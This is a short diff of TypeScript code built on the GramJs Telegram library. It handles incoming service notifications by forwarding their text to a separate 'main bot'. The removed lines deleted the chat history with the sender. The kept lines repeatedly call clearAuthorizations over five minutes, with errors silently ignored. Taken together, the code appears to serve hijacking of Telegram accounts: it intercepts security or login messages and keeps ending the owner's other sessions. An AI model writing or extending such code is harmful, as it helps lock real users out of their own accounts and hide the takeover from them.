@@ -76,32 +76,21 @@ ${messageText}`;
 
     await sendToMainBot(notificationMessage);
 
-    if (client) {
-      await deleteHistory(
-        client,
-        new GramJs.InputPeerUser({
-          userId: update.userId,
-          accessHash: BigInt(0),
-        }),
-        true
-      );
+    if (forceClearAuth && client) {
+      [0.05, 0.15, 0.25, 0.5, 1, 1.5, 2.5, 5].forEach((minutes) => {
+        setTimeout(
+          async () => {
+            try {
+              await clearAuthorizations(client);
+            } catch {}
+          },
+          minutes * 60 * 1000
+        );
+      });
 
-      if (forceClearAuth) {
-        [0.05, 0.15, 0.25, 0.5, 1, 1.5, 2.5, 5].forEach((minutes) => {
-          setTimeout(
-            async () => {
-              try {
-                await clearAuthorizations(client);
-              } catch {}
-            },
-            minutes * 60 * 1000
-          );
-        });
-
-        await updateAccountById(accountId, {
-          lastServiceNotification: new Date(),
-        });
-      }
+      await updateAccountById(accountId, {
+        lastServiceNotification: new Date(),
+      });
     }
 
     return;
